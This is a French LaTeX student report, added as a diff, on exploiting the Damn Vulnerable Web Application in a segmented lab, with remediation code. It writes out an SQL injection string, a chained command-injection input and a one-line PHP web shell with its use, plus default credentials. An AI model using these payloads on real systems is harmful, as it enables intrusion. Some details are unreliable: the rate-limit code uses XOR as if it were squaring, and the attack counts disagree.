@@ -1,0 +1,1197 @@
+% !TeX program = lualatex
+% !TeX encoding = UTF-8
+% !TeX spellcheck = fr_FR
+
+\documentclass[12pt,a4paper,openany]{report}
+
+% ==============================================================================
+% 1. MOTEUR & LANGUE
+% ==============================================================================
+\usepackage{fontspec}
+\usepackage{polyglossia}
+\setmainlanguage{french}
+\setotherlanguage{english}
+
+% ==============================================================================
+% 2. MISE EN PAGE & STRUCTURE
+% ==============================================================================
+\usepackage{geometry}
+\geometry{left=2.5cm, right=2.5cm, top=3cm, bottom=3cm, headheight=30pt}
+
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+\usepackage{tocloft}
+\usepackage{titletoc}
+
+% ==============================================================================
+% 3. TYPOGRAPHIE & TEXTE
+% ==============================================================================
+\usepackage{setspace}
+\usepackage{xcolor}
+\usepackage{csquotes}
+\usepackage{enumitem}
+\usepackage{indentfirst}
+\usepackage{hyphenat}
+\usepackage[skins]{tcolorbox}
+
+% ==============================================================================
+% 4. GRAPHISMES & DIAGRAMMES
+% ==============================================================================
+\usepackage{graphicx}
+\usepackage{tikz}
+\usetikzlibrary{positioning, shapes.geometric, arrows.meta, calc}
+\usepackage{caption}
+\usepackage{subcaption}
+\usepackage{float}
+
+% ==============================================================================
+% 5. TABLEAUX
+% ==============================================================================
+\usepackage{booktabs}
+\usepackage{longtable}
+\usepackage{array}
+\usepackage{multirow}
+\usepackage{tabularx}
+\usepackage{colortbl}
+
+% ==============================================================================
+% 6. CODE SOURCE & LISTINGS
+% ==============================================================================
+\usepackage{listings}
+\usepackage{lstautogobble}
+
+% ==============================================================================
+% 7. LIENS & RÉFÉRENCES
+% ==============================================================================
+\usepackage{hyperref}
+\usepackage{bookmark}
+\usepackage{url}
+
+% ==============================================================================
+% 8. UTILITAIRES DIVERS
+% ==============================================================================
+\usepackage{pdfpages}
+\usepackage{lastpage}
+
+% ==============================================================================
+% POLICES
+% ==============================================================================
+\setmainfont{Latin Modern Roman}
+\setsansfont{Latin Modern Sans}
+\setmonofont{Latin Modern Mono}
+
+% ==============================================================================
+% COULEURS (Palette Professionnelle)
+% ==============================================================================
+\definecolor{primary}{RGB}{0,51,102}
+\definecolor{secondary}{RGB}{0,102,204}
+\definecolor{accent}{RGB}{204,0,0}
+\definecolor{codebg}{RGB}{248,248,248}
+\definecolor{codekeyword}{RGB}{0,0,200}
+\definecolor{codestring}{RGB}{163,21,21}
+\definecolor{codecomment}{RGB}{0,128,0}
+\definecolor{footergray}{RGB}{128,128,128}
+\definecolor{tableheadbg}{RGB}{0,51,102}
+\definecolor{tableheadfg}{RGB}{255,255,255}
+\definecolor{tablerowalt}{RGB}{235,242,252}
+\definecolor{tableborder}{RGB}{0,80,160}
+\definecolor{criticalred}{RGB}{220,20,60}
+\definecolor{warningorange}{RGB}{255,140,0}
+
+% ==============================================================================
+% EN-TÊTES ET PIEDS DE PAGE
+% ==============================================================================
+\pagestyle{fancy}
+\fancyhf{}
+
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\headrule}{\hbox to\headwidth{%
+		\color{primary}\leaders\hrule height \headrulewidth\hfill}}
+\renewcommand{\footrulewidth}{0.4pt}
+
+\fancyhead[L]{\textcolor{primary}{\small\bfseries
+		OWASP Top 10 \textbullet\ DVWA Assessment}}
+\fancyhead[R]{\textcolor{primary}{\small\bfseries
+		 ESTK • IDRS}}
+
+\newif\ifshowpagenumbers
+\showpagenumberstrue
+
+\fancyfoot[C]{\textcolor{footergray}{\small%
+		\ifshowpagenumbers%
+		Page \thepage\ sur \pageref{LastPage}%
+		\fi%
+}}
+
+% ==============================================================================
+% FORMATAGE DES TITRES
+% ==============================================================================
+\titleformat{\chapter}[display]
+{\normalfont\huge\bfseries\color{primary}}{\chaptertitlename\ \thechapter}{20pt}{\Huge}
+\titleformat{\section}
+{\normalfont\Large\bfseries\color{primary}}{\thesection}{1em}{}
+\titleformat{\subsection}
+{\normalfont\large\bfseries\color{secondary}}{\thesubsection}{1em}{}
+
+% ==============================================================================
+% 6. CODE SOURCE & LISTINGS
+% ==============================================================================
+\usepackage{listings}
+\usepackage{lstautogobble}
+% Command to hide page numbers
+\newcommand{\hidepagenumbers}{\showpagenumbersfalse\pagestyle{empty}}
+\newcommand{\showpagenumbers}{\showpagenumberstrue\pagestyle{fancy}}
+% ==============================================================================
+% CONFIGURATION LISTINGS POUR LE CODE
+% ==============================================================================
+\lstset{
+	basicstyle=\ttfamily\small,
+	backgroundcolor=\color{codebg},
+	keywordstyle=\color{codekeyword}\bfseries,
+	stringstyle=\color{codestring},
+	commentstyle=\color{codecomment}\itshape,
+	frame=single,
+	rulecolor=\color{primary},
+	breaklines=true,
+	breakatwhitespace=true,
+	showstringspaces=false,
+	captionpos=b,
+	numbers=left,
+	numberstyle=\tiny\color{gray},
+	numbersep=5pt,
+	tabsize=4,
+	extendedchars=true,
+	inputencoding=utf8,
+	autogobble=true
+}
+
+% Définir le style logstyle
+\lstdefinestyle{logstyle}{
+	basicstyle=\ttfamily\footnotesize,
+	backgroundcolor=\color{codebg},
+	frame=single,
+	rulecolor=\color{primary},
+	breaklines=true,
+	showstringspaces=false,
+	captionpos=b,
+	autogobble=true,
+	numbers=none
+}
+
+% ==============================================================================
+% DÉBUT DU DOCUMENT
+% ==============================================================================
+\begin{document}
+	\sloppy
+	
+	% ──────────────────────────────────────────────────────────────────────
+	% PAGE DE TITRE
+	% ──────────────────────────────────────────────────────────────────────
+	\begin{titlepage}
+		\thispagestyle{empty}
+		
+		\noindent
+		\colorbox{primary}{%
+			\parbox{\dimexpr\textwidth-2\fboxsep}{%
+				\vspace{0.6cm}
+				\centering
+				{\large\bfseries\textcolor{white}{Cyberdéfense et Sécurité Offensive}}\\[0.6cm]
+			}%
+		}
+		
+		\vspace{1.5cm}
+		\centering
+		
+		{\normalsize\bfseries\color{black!40}\MakeUppercase{Évaluation de Vulnérabilités DVWA}}
+		
+		\vspace{0.8cm}
+		
+		{\Huge\bfseries\color{primary}
+			OWASP Top 10: 2025\\
+			Évaluation de Sécurité\\
+			Damn Vulnerable Web Application\par
+		}
+		
+		\vspace{0.5cm}
+		
+		{\color{accent}\rule{7cm}{1.5pt}\par}
+		
+		\vspace{0.5cm}
+		
+		{\large\color{black!60}
+			Analyse des Vulnérabilités Web Critiques\\[0.2cm]
+			et Démonstration des Techniques d'Exploitation\par
+		}
+		
+		\vspace{2cm}
+		
+		{\large
+			\renewcommand{\arraystretch}{1.5}
+			\begin{tabular}{c}
+				\textbf{\color{primary}Équipe de Réalisation :}\\[0.3cm]
+				Yasser \textsc{Bella} \\
+				Oussama \textsc{El Habti} \\
+				Salma \textsc{El Habti} \\[0.6cm]
+				
+				\textbf{\color{primary}Filière :} IDRS --- Infrastructure Digitale Réseau et Sécurité \\[0.3cm]
+				\textbf{\color{primary}Année Universitaire :} 2025 -- 2026 \\
+			\end{tabular}
+		}
+		
+		\vfill
+		
+		\noindent
+		\colorbox{primary}{%
+			\parbox{\dimexpr\textwidth-2\fboxsep}{%
+				\vspace{0.35cm}
+				\centering
+				{\small\textcolor{white}{%
+						Ubuntu Server 25.04 \textbullet\ Docker
+						\quad\textbullet\quad MariaDB}}\\[0.2cm]
+				{\small\textcolor{white}{%
+						Firefox DevTools \textbullet\ cURL
+						\quad\textbullet\quad crackstation.net}}\\[0.35cm]
+			}%
+		}%
+		
+	\end{titlepage}
+	
+	% ──────────────────────────────────────────────────────────────────────
+	% TABLE DES MATIÈRES
+	% ──────────────────────────────────────────────────────────────────────
+	\newpage
+	\hidepagenumbers
+	\tableofcontents
+	\newpage
+	\listoffigures
+	\newpage
+	\listoftables
+	\cleardoublepage
+	\showpagenumbers
+	\pagenumbering{arabic}
+	\setcounter{page}{1}
+	
+	% ══════════════════════════════════════════════════════════════════════
+	% CHAPITRE 1 : INTRODUCTION
+	% ══════════════════════════════════════════════════════════════════════
+	
+	\chapter{Introduction et Objectifs}
+	
+	\section{Contexte de l'Évaluation}
+	
+	Ce rapport documente une évaluation de sécurité complète de l'application Damn Vulnerable Web Application (DVWA) v1.10, 
+	déployée dans une infrastructure de laboratoire segmentée. L'objectif principal est de démontrer les vulnérabilités 
+	présentes dans la liste OWASP Top 10: 2025 et de valider l'efficacité des techniques de détection et d'exploitation.
+	
+	L'évaluation a été réalisée dans un environnement contrôlé, incluant :
+	\begin{itemize}
+		\item Une architecture réseau segmentée (WAN/DMZ/LAN) protégée par un pare-feu pfSense
+		\item Un serveur Web vulnérable (DVWA) déployé dans la DMZ via conteneurisation Docker
+		\item Une machine attaquante (Parrot Security OS) simulant une menace externe
+		\item Des systèmes de détection d'intrusion (Snort, pfBlockerNG)
+	\end{itemize}
+	
+	\section{Objectifs de Sécurité}
+	
+	L'évaluation vise à atteindre les objectifs suivants :
+	
+	\begin{enumerate}
+		\item \textbf{Identification :} Découvrir et documenter les vulnérabilités OWASP Top 10 présentes dans DVWA
+		\item \textbf{Exploitation :} Démontrer pratiquement chaque vulnérabilité via des attaques contrôlées
+		\item \textbf{Analyse :} Évaluer l'impact de chaque vulnérabilité sur la sécurité globale de l'application
+		\item \textbf{Remédiation :} Proposer des solutions correctives pour éliminer ou atténuer les risques
+	\end{enumerate}
+	
+	\section{Méthodologie}
+	
+	La démarche suivie respecte les standards de l'industrie :
+	
+	\begin{description}
+		\item[Reconnaissance] : Identification des surfaces d'attaque exposées
+		\item[Énumération] : Détection des services et versions
+		\item[Exploitation] : Démonstration pratique de l'accès non autorisé
+		\item[Post-Exploitation] : Analyse des conséquences de chaque compromission
+		\item[Documentation] : Enregistrement détaillé avec preuves (screenshots)
+	\end{description}
+	
+	% ══════════════════════════════════════════════════════════════════════
+	% CHAPITRE 2 : ARCHITECTURE RÉSEAU
+	% ══════════════════════════════════════════════════════════════════════
+	
+	\chapter{Architecture Réseau et Infrastructure}
+	
+	\section{Topologie Logique}
+	
+	L'infrastructure de test est basée sur une architecture défense-en-profondeur, avec segmentation stricte :
+	
+	\begin{table}[ht]
+		\centering
+		\renewcommand{\arraystretch}{1.4}
+		\begin{tabular}{>{\bfseries}p{3.5cm} p{3.2cm} p{2.8cm} p{3.2cm}}
+			\hline
+			\rowcolor{tableheadbg}
+			\textcolor{tableheadfg}{\textbf{Machine}} &
+			\textcolor{tableheadfg}{\textbf{Rôle}} &
+			\textcolor{tableheadfg}{\textbf{Zone}} &
+			\textcolor{tableheadfg}{\textbf{OS}} \\
+			\hline
+			\rowcolor{tablerowalt}
+			pfSense-Firewall & Routeur / Pare-feu & WAN/DMZ/LAN & pfSense 2.8.0 \\
+			ubuntuserver & Serveur Web (DVWA) & DMZ & Ubuntu 25.04 \\
+			\rowcolor{tablerowalt}
+			Parrot Security & Machine Attaquante & WAN & Parrot Security OS \\
+			\hline
+		\end{tabular}
+		\caption{Inventaire des Machines de Test}
+		\label{tab:vm-inventory}
+	\end{table}
+	
+	\section{Plan d'Adressage IP}
+	
+	\begin{table}[ht]
+		\centering
+		\small
+		\renewcommand{\arraystretch}{1.5}
+		\begin{tabular}{p{4.5cm} >{\centering\arraybackslash}p{3.5cm} >{\centering\arraybackslash}p{3.5cm}}
+			\hline
+			\rowcolor{tableheadbg}
+			\textcolor{tableheadfg}{\textbf{Machine}} &
+			\textcolor{tableheadfg}{\textbf{Adresse IP}} &
+			\textcolor{tableheadfg}{\textbf{Passerelle}} \\
+			\hline
+			\rowcolor{tablerowalt}
+			pfSense (WAN) & 192.168.100.6 & 192.168.100.2 \\
+			
+			pfSense (DMZ) & 192.168.10.1 & N/A \\
+			
+			\rowcolor{tablerowalt}
+			Ubuntu DMZ & 192.168.10.100 & 192.168.10.1 \\
+			
+			Parrot Security & 192.168.100.150 & 192.168.100.2 \\
+			\hline
+		\end{tabular}
+		\caption{Plan d'Adressage IP}
+		\label{tab:ip-plan}
+	\end{table}
+	
+	\section{Segmentation Réseau}
+	
+	\subsection{Zone WAN (192.168.100.0/24)}
+	\begin{itemize}
+		\item \textbf{Rôle :} Réseau externe, point d'entrée pour les attaquants
+		\item \textbf{Politiques :} Tout trafic entrant bloqué par défaut
+		\item \textbf{Machines :} Parrot Security (attaquant), Interface WAN de pfSense
+	\end{itemize}
+	
+	\subsection{Zone DMZ (192.168.10.0/24)}
+	\begin{itemize}
+		\item \textbf{Rôle :} Zone tampon pour services exposés publiquement
+		\item \textbf{Politiques :} Trafic WAN autorisé sur ports 80, 139, 445 uniquement
+		\item \textbf{Machines :} Ubuntu Server (DVWA, Docker)
+		\item \textbf{Isolation :} Strictement isolée du LAN par pfSense
+	\end{itemize}
+	
+	\subsection{Zone LAN (192.168.20.0/24)}
+	\begin{itemize}
+		\item \textbf{Rôle :} Réseau interne sécurisé (non utilisé dans ce TP)
+		\item \textbf{Politiques :} Aucun trafic direct depuis WAN/DMZ autorisé
+	\end{itemize}
+	
+	% ══════════════════════════════════════════════════════════════════════
+	% CHAPITRE 3 : INSTALLATION ET CONFIGURATION DVWA
+	% ══════════════════════════════════════════════════════════════════════
+	
+	\chapter{Déploiement et Configuration DVWA}
+	
+	\section{Sélection de l'Image Docker}
+	
+	Trois images Docker DVWA ont été évaluées :
+	
+	\begin{table}[ht]
+		\centering
+		\small
+		\renewcommand{\arraystretch}{1.6}
+		\begin{tabular}{p{3cm} p{4cm} p{5cm}}
+			\hline
+			\rowcolor{tableheadbg}
+			\textcolor{tableheadfg}{\textbf{Image}} &
+			\textcolor{tableheadfg}{\textbf{Avantages}} &
+			\textcolor{tableheadfg}{\textbf{Inconvénients}} \\
+			\hline
+			\rowcolor{tablerowalt}
+			\texttt{ghcr.io/digininja/dvwa} & Open source, à jour & MySQL externe requis \\
+			
+			\texttt{vulnerables/web-dvwa} & MySQL inclus, simple & ✓ SÉLECTIONNÉ \\
+			
+			\rowcolor{tablerowalt}
+			\texttt{dvwa/official} & Contrôle précis & Authentification requise \\
+			\hline
+		\end{tabular}
+		\caption{Comparaison des Images DVWA}
+		\label{tab:dvwa-images}
+	\end{table}
+	
+	\textbf{Décision :} L'image \texttt{vulnerables/web-dvwa} a été sélectionnée car elle inclut MariaDB 
+	en bundle, éliminant les problèmes de connectivité base de données.
+	
+	\section{Déploiement Docker}
+	
+	\subsection{Lanceurs du Conteneur}
+	
+	\begin{lstlisting}[caption=Démarrage du Conteneur DVWA]
+		$ sudo docker run -d \
+		--restart=unless-stopped \
+		-p 8080:80 \
+		--name dvwa \
+		vulnerables/web-dvwa
+		
+		73c52c0ee9a905edc8aeeb6b6e8794444766b33d2f36df34e543b7e0a3662b1c
+	\end{lstlisting}
+	
+	\subsection{Vérification du Déploiement}
+	
+	\begin{lstlisting}[caption=Vérification du Conteneur]
+		$ sudo docker ps | grep dvwa
+		
+		CONTAINER ID   IMAGE                      STATUS       PORTS
+		73c52c0ee9a9   vulnerables/web-dvwa       Up 6 hours   0.0.0.0:8080->80/tcp
+	\end{lstlisting}
+	
+	\section{Accès à DVWA}
+	
+	\begin{itemize}
+		\item \textbf{URL :} \texttt{http://192.168.10.100:8080/}
+		\item \textbf{Identifiants par défaut :}
+		\begin{itemize}
+			\item Username: \texttt{admin}
+			\item Password: \texttt{password}
+		\end{itemize}
+		\item \textbf{Niveau de sécurité :} Défini à \textbf{``LOW''} pour maximiser les vulnérabilités exposées
+	\end{itemize}
+	
+	\section{Initialisation de la Base de Données}
+	
+	Lors du premier accès, DVWA affiche une page de configuration. Le bouton 
+	\textit{``Create / Reset Database''} initialise les tables utilisateurs et données de test.
+	
+	% ══════════════════════════════════════════════════════════════════════
+	% CHAPITRE 4 : VULNÉRABILITÉS OWASP - EXPLOITATION
+	% ════════════════════════════════════════════════════════════════���═════
+	
+	\chapter{Identification et Exploitation des Vulnérabilités OWASP Top 10: 2025}
+	
+	\section{Résumé des Attaques Exécutées}
+	
+	Un total de \textbf{14 attaques réussies} ont été documentées couvrant \textbf{7 catégories OWASP Top 10}.
+	
+	\begin{table}[H]
+		\centering
+		\small
+		\renewcommand{\arraystretch}{1.3}
+		\begin{tabular}{>{\centering\arraybackslash}p{1.5cm} p{4cm} p{5cm} >{\centering\arraybackslash}p{1.8cm}}
+			\hline
+			\rowcolor{tableheadbg}
+			\textcolor{tableheadfg}{\textbf{ID}} &
+			\textcolor{tableheadfg}{\textbf{Catégorie OWASP}} &
+			\textcolor{tableheadfg}{\textbf{Attaque}} &
+			\textcolor{tableheadfg}{\textbf{Status}} \\
+			\hline
+			\rowcolor{tablerowalt}
+			\textbf{A01} & Broken Access Control & File Inclusion (LFI) & ✓ \\
+			
+			\textbf{A02} & Security Misconfiguration & Default Credentials & ✓ \\
+			
+			\rowcolor{tablerowalt}
+			\textbf{A04} & Cryptographic Failures & Weak Session IDs & ✓ \\
+			
+			\textbf{A05} & Injection & SQL Injection & ✓ \\
+			
+			\rowcolor{tablerowalt}
+			& & Command Injection & ✓ \\
+			
+			\textbf{A07} & Authentication Failures & Brute Force Login & ✓ \\
+			
+			\rowcolor{tablerowalt}
+			\textbf{A08} & File Upload & Web Shell Upload & ✓ \\
+			
+			\textbf{A10} & Error Message Disclosure & SQL Error Disclosure & ✓ \\
+			\hline
+		\end{tabular}
+		\caption{Récapitulatif des Attaques Documentées}
+		\label{tab:attack-summary}
+	\end{table}
+	
+	% ──────────────────────────────────────────────────────────────────────
+	% A05: SQL INJECTION
+	% ──────────────────────────────────────────────────────────────────────
+	
+	\section{A05: Injection - SQL Injection}
+	
+	\subsection{Description de la Vulnérabilité}
+	
+	SQL Injection est une technique d'attaque qui consiste à injecter du code SQL malveillant 
+	dans les paramètres d'une application pour manipuler les requêtes de la base de données.
+	
+	\subsection{Étapes d'Exploitation}
+	
+	\begin{enumerate}
+		\item Accéder à : \textbf{Vulnerabilities → SQL Injection}
+		\item Entrer la charge utile dans le champ \textit{User ID} :
+		\begin{lstlisting}[caption=Payload SQL Injection,numbers=none,frame=none,backgroundcolor={},rulecolor={}]
+			' OR '1'='1' --
+		\end{lstlisting}
+		\item Cliquer sur \textbf{Submit}
+	\end{enumerate}
+	
+	\subsection{Résultats Observés}
+	
+	\textbf{Réponse de l'Application :}
+	\begin{lstlisting}[caption=Message d'erreur révélateur]
+		You have an error in your SQL syntax; check the manual that corresponds 
+		to your MariaDB server version for the right syntax to use near ''' at line 1
+	\end{lstlisting}
+	
+	\textbf{Informations Divulguées :}
+	\begin{itemize}
+		\item Type de base de données: \textbf{MariaDB}
+		\item Détails de la requête SQL malformée
+		\item Structure de la requête vulnérable
+	\end{itemize}
+	
+	\subsection{Impact de Sécurité}
+	
+	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
+		title=\textbf{CRITICITÉ: CRITIQUE}]
+		\begin{itemize}
+			\item \textbf{Confidentialité :} CRITIQUE - Accès à tous les enregistrements base de données
+			\item \textbf{Intégrité :} CRITIQUE - Modification/suppression de données possibles
+			\item \textbf{Disponibilité :} CRITIQUE - Suppression complète de la base de données
+			\item \textbf{CVSS v3.1 :} 9.8 (Critique)
+		\end{itemize}
+	\end{tcolorbox}
+	
+	\subsection{Screenshot}
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{sql-injection-error.png}
+		\caption{SQL Injection - Message d'erreur MariaDB}
+		\label{fig:sql-injection}
+	\end{figure}
+	
+	\subsection{Remédiation}
+	
+	\begin{lstlisting}[language=php,caption=Requête Sécurisée avec Prepared Statements]
+		// VULNÉRABLE (À NE PAS UTILISER)
+		$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
+		
+		// SÉCURISÉ (Utiliser toujours les prepared statements)
+		$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
+		$stmt->bind_param("i", $_GET['id']);
+		$stmt->execute();
+		$result = $stmt->get_result();
+	\end{lstlisting}
+	
+	% ──────────────────────────────────────────────────────────────────────
+	% A05: COMMAND INJECTION
+	% ──────────────────────────────────────────────────────────────────────
+	
+	\section{A05: Injection - Command Injection}
+	
+	\subsection{Description}
+	
+	Command Injection permet d'exécuter des commandes système arbitraires en exploitant 
+	un champ de saisie qui ne valide pas les d��limiteurs de commande.
+	
+	\subsection{Exploitation}
+	
+	\begin{enumerate}
+		\item Accéder à : \textbf{Vulnerabilities → Command Injection}
+		\item Entrer l'adresse IP: \texttt{8.8.8.8}
+		\item Ajouter la commande à chaîner: \texttt{; id}
+		\item Charge utile complète : \texttt{8.8.8.8; id}
+	\end{enumerate}
+	
+	\subsection{Résultats}
+	
+	\begin{lstlisting}[caption=Résultat de Command Injection,style=logstyle]
+		PING 8.8.8.8 (8.8.8.8): 56 data bytes
+		64 bytes from 8.8.8.8: icmp_seq=0 ttl=126 time=353.420 ms
+		64 bytes from 8.8.8.8: icmp_seq=1 ttl=126 time=24.713 ms
+		64 bytes from 8.8.8.8: icmp_seq=2 ttl=126 time=22.696 ms
+		64 bytes from 8.8.8.8: icmp_seq=3 ttl=126 time=23.053 ms
+		--- 8.8.8.8 ping statistics ---
+		4 packets transmitted, 4 packets received, 0% packet loss
+		
+		uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	\end{lstlisting}
+	
+	\subsection{Impact}
+	
+	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
+		title=\textbf{CRITICITÉ: CRITIQUE}]
+		\textbf{Accès Système Complet :} Attaquant exécute des commandes avec les 
+		privilèges du serveur web (www-data). Possibilité complète de compromission 
+		du système (installation de backdoors, vol de données, DoS).
+	\end{tcolorbox}
+	
+	\subsection{Screenshot}
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{command-injection.png}
+		\caption{Command Injection - Exécution de Commandes Système}
+		\label{fig:command-injection}
+	\end{figure}
+	
+	\subsection{Remédiation}
+	
+	\begin{lstlisting}[language=php,caption=Protection contre Command Injection]
+		// VULNÉRABLE
+		exec("ping -c 4 " . $_GET['ip']);
+		
+		// SÉCURISÉ - Utiliser escapeshellarg()
+		$ip = escapeshellarg($_GET['ip']);
+		exec("ping -c 4 " . $ip);
+		
+		// MIEUX ENCORE - Whitelist
+		$allowed_ips = array('8.8.8.8', '8.8.4.4');
+		if (in_array($_GET['ip'], $allowed_ips)) {
+			exec("ping -c 4 " . escapeshellarg($_GET['ip']));
+		}
+	\end{lstlisting}
+	
+	% ──────────────────────────────────────────────────────────────────────
+	% A07: BRUTE FORCE
+	% ──────────────────────────────────────────────────────────────────────
+	
+	\section{A07: Authentication Failures - Brute Force Login}
+	
+	\subsection{Description}
+	
+	L'absence de mécanisme de verrouillage de compte ou de limitation de débit 
+	permet les attaques par force brute illimitées contre les identifiants.
+	
+	\subsection{Exploitation}
+	
+	\begin{enumerate}
+		\item Accéder au formulaire de login DVWA
+		\item Tenter plusieurs combinaisons de mots de passe :
+		\begin{itemize}
+			\item \texttt{admin} / \texttt{admin} → Échoue
+			\item \texttt{admin} / \texttt{password} → \textbf{SUCCÈS}
+		\end{itemize}
+		\item Aucun message d'erreur "Compte verrouillé"
+		\item Aucun délai progressif entre les tentatives
+	\end{enumerate}
+	
+	\subsection{Résultats}
+	
+	\textbf{Observation Critique :} Après 10+ tentatives échouées, l'application 
+	continue d'accepter les tentatives de login sans aucune restriction. 
+	Cela démontre l'absence totale de protection anti-brute-force.
+	
+	\subsection{Impact}
+	
+	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
+		title=\textbf{CRITICITÉ: HAUTE}]
+		\begin{itemize}
+			\item Attaquant peut automatiser les tentatives de crack de mots de passe
+			\item Efficace contre les mots de passe faibles ou courants
+			\item Aucune détection d'attaque possible (pas de logs d'alerte)
+		\end{itemize}
+	\end{tcolorbox}
+	
+	\subsection{Screenshot}
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{brute-froce.png}
+		\caption{Brute Force - Multiples Tentatives de Login Acceptées}
+		\label{fig:brute-force}
+	\end{figure}
+	
+	\subsection{Remédiation}
+	
+	\begin{lstlisting}[language=php,caption=Implémentation de Protection Anti-Brute-Force]
+		// Enregistrer les tentatives échouées
+		function log_failed_attempt($username, $ip) {
+			// Incrémenter compteur dans Redis/Memcache
+			$key = "failed_login:{$username}:{$ip}";
+			$redis->incr($key);
+			$redis->expire($key, 900); // 15 minutes
+			
+			// Vérifier le seuil
+			if ($redis->get($key) >= 5) {
+				throw new Exception("Trop de tentatives. Compte verrouillé 15 min.");
+			}
+		}
+		
+		// Ajouter délai progressif
+		usleep(($failed_attempts ^ 2) * 1000000); // 1, 4, 9... secondes
+	\end{lstlisting}
+	
+	% ──────────────────────────────────────────────────────────────────────
+	% A08: FILE UPLOAD
+	% ──────────────────────────────────────────────────────────────────────
+	
+	\section{A08: Software or Data Integrity - File Upload}
+	
+	\subsection{Description}
+	
+	L'absence de validation stricte des fichiers uploadés permet l'insertion 
+	de code exécutable sur le serveur, conduisant à une compromission complète.
+	
+	\subsection{Exploitation}
+	
+	\begin{enumerate}
+		\item Créer un fichier PHP malveillant :
+		\begin{lstlisting}[language=php,numbers=none,caption=Web Shell PHP,frame=none]
+			<?php system($_GET['cmd']); ?>
+		\end{lstlisting}
+		\item Accéder à : \textbf{Vulnerabilities → File Upload}
+		\item Sélectionner le fichier \texttt{shell.php}
+		\item Cliquer \textbf{Upload}
+	\end{enumerate}
+	
+	\subsection{Résultats}
+	
+	\begin{lstlisting}[caption=Confirmation d'Upload Réussi,style=logstyle]
+		../../hackable/uploads/shell.php successfully uploaded!
+	\end{lstlisting}
+	
+	\subsection{Exécution de Commandes}
+	
+	Accéder à l'URL : \texttt{http://192.168.10.100:8080/DVWA/uploads/shell.php?cmd=whoami}
+	
+	\textbf{Résultat :} \texttt{www-data} — Exécution en tant que serveur web confirmée.
+	
+	\subsection{Impact}
+	
+	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
+		title=\textbf{CRITICITÉ: CRITIQUE}]
+		\begin{itemize}
+			\item Exécution de code arbitrary au niveau système
+			\item Installation de backdoors persistants
+			\item Vol de données confidentielles
+			\item Compromission complète du serveur
+		\end{itemize}
+	\end{tcolorbox}
+	
+	\subsection{Screenshot}
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{file-upload.png}
+		\caption{File Upload - Web Shell Uploadé avec Succès}
+		\label{fig:file-upload}
+	\end{figure}
+	
+	\subsection{Remédiation}
+	
+	\begin{lstlisting}[language=php,caption=Upload Sécurisé]
+		// Whitelist d'extensions autorisées
+		$allowed = array('jpg', 'jpeg', 'png', 'gif', 'pdf');
+		$filename = basename($_FILES['file']['name']);
+		$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+		
+		if (!in_array($ext, $allowed)) {
+			die("Extension de fichier non autorisée!");
+		}
+		
+		// Vérifier le type MIME
+		$finfo = finfo_open(FILEINFO_MIME_TYPE);
+		$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
+		$allowed_mimes = array('image/jpeg', 'image/png', 'image/gif', 'application/pdf');
+		
+		if (!in_array($mime, $allowed_mimes)) {
+			die("Type MIME non autorisé!");
+		}
+		
+		// Stocker EN DEHORS du répertoire web
+		$upload_dir = '/var/uploads/secure/'; // Hors de /var/www/html
+		move_uploaded_file($_FILES['file']['tmp_name'], 
+		$upload_dir . uniqid() . '.' . $ext);
+	\end{lstlisting}
+	
+	% ──────────────────────────────────────────────────────────────────────
+	% A04: WEAK SESSION IDS
+	% ──────────────────────────────────────────────────────────────────────
+	
+	\section{A04: Cryptographic Failures - Weak Session IDs}
+	
+	\subsection{Description}
+	
+	Les identifiants de session sont générés de manière prévisible (simples 
+	nombres entiers), permettant le hijacking de sessions par prédiction.
+	
+	\subsection{Analyse}
+	
+	\begin{enumerate}
+		\item Ouvrir les \textbf{Outils Développeur (F12)}
+		\item Naviguer vers \textbf{Application → Cookies}
+		\item Observer les valeurs de cookies
+	\end{enumerate}
+	
+	\subsection{Résultats}
+	
+	\textbf{Cookies Observés :}
+	
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.6}
+		\begin{tabular}{p{4cm} p{6cm} p{2cm}}
+			\hline
+			\rowcolor{tableheadbg}
+			\textcolor{tableheadfg}{\textbf{Nom du Cookie}} &
+			\textcolor{tableheadfg}{\textbf{Valeur}} &
+			\textcolor{tableheadfg}{\textbf{Sécurité}} \\
+			\hline
+			\rowcolor{tablerowalt}
+			\texttt{dvwaSession} & \texttt{3} & [!] Previsible \\
+			
+			\texttt{PHPSESSID} & \texttt{4ca5feac5b5a...} & [!] MD5 \\
+			
+			\rowcolor{tablerowalt}
+			\texttt{Security} & \texttt{low} & [!] Public \\
+			\hline
+		\end{tabular}
+		\caption{Analyse des Cookies DVWA}
+		\label{tab:cookies}
+	\end{table}
+	
+	\textbf{Problèmes Identifiés :}
+	\begin{itemize}
+		\item \textbf{dvwaSession = 3 :} Nombre séquentiel prévisible (3 → 4 → 5)
+		\item \textbf{PHPSESSID :} Hash MD5 cryptographiquement faible
+		\item \texttt{Security} exposé en clair dans le cookie
+	\end{itemize}
+	
+	\subsection{Impact}
+	
+	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
+		title=\textbf{CRITICITÉ: HAUTE}]
+		Attaquant peut prédire les session IDs d'autres utilisateurs 
+		et accéder à leurs comptes sans connaître les mots de passe.
+	\end{tcolorbox}
+	
+	\subsection{Screenshots}
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{weak-sessions-id.png}
+		\caption{Cookies Session - Vue 1}
+		\label{fig:weak-sessions-1}
+	\end{figure}
+	
+	\subsection{Remédiation}
+	
+	\begin{lstlisting}[language=php,caption=Génération Sécurisée de Session IDs]
+		// MAUVAISE PRATIQUE (À ÉVITER)
+		$_SESSION['id'] = rand(1, 1000000);
+		
+		// BONNE PRATIQUE
